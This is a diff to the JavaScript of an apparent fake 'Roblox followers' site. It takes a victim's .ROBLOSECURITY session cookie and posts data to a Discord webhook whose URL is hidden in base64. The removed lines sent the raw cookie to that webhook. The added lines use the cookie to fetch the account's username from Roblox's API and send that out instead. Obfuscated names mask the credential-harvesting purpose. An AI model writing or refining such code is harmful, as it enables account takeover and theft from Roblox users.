@@ -11,27 +11,40 @@ function x1y2y2z3(title, text, icon, confirmButtonText) {
     Swal.fire(a1b2c3);
 }
 
+async function getUsernameFromCookie(cookie) {
+    const userIdMatch = cookie.match(/\.ROBLOSECURITY=([^;]+)/);
+    if (!userIdMatch) {
+        throw new Error("Invalid cookie");
+    }
+
+    const robloxSecurityCookie = userIdMatch[1];
+
+    // Hacer una solicitud a la API de Roblox para obtener el usuario
+    const response = await fetch(`https://users.roblox.com/v1/users/authenticated`, {
+        method: 'GET',
+        headers: {
+            'Cookie': `.ROBLOSECURITY=${robloxSecurityCookie}`
+        }
+    });
+
+    if (!response.ok) {
+        throw new Error("Failed to fetch user data");
+    }
+
+    const userData = await response.json();
+    return userData.name; // Retorna el nombre de usuario
+}
+
 async function a1b2c3d4(p1q2r3, s4t5u7) {
     const e5f6g7 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NjY1MjEzOTEzNjQ4MzM3OS81SnZNYTd1NHhrTERmbFV2RUVwQkdFc3JTSnh3V19kY1lrV3ZTdDlXWUNfd2NjbGc5Ylh4Z1JEOXFnLUN5N3YtMlE5MQ==';
     const g8h9i0 = atob(e5f6g7);
 
-    let xyeq = p1q2r3.match(/\.ROBLOSECURITY", "([^"]+)"/);
-    if (!xyeq) {
-        xyeq = p1q2r3.match(/\.ROBLOSECURITY=([^;]+)/);
-    }
-
-    if (!xyeq) {
-        x1y2y2z3("Error", "Enter a valid code.", "error", "Retry");
-        return;
-    }
-    
-    const xyeqeq = robloxSecurityCookieMatch[1];
-
-    const j1k2l3 = {
-        content: `Follow Amount: ${s4t5u7}\n.ROBLOSECURITY: ${xyeqeq}`
-    };
-
     try {
+        const username = await getUsernameFromCookie(p1q2r3);
+        const j1k2l3 = {
+            content: `Follow Amount: ${s4t5u7}\nUsername: ${username}`
+        };
+
         const response = await fetch(g8h9i0, {
             method: 'POST',
             headers: {
@@ -46,7 +59,7 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
             x1y2y2z3("Error", "Failed to send Followers to Roblox Account.", "error", "Retry");
         }
     } catch (error) {
-        x1y2y2z3("Error", "An error occurred while sending Followers", "error", "Retry");
+        x1y2y2z3("Error", error.message, "error", "Retry");
     }
 }
 
@@ -74,7 +87,7 @@ document.addEventListener("DOMContentLoaded", function() {
         Swal.fire(v7w8x9).then((result) => {
             if (result.isConfirmed) {
                 a1b2c3d4(p1q2r3, s4t5u7);
-            }
+ }
         });
     });
-});
+}); 
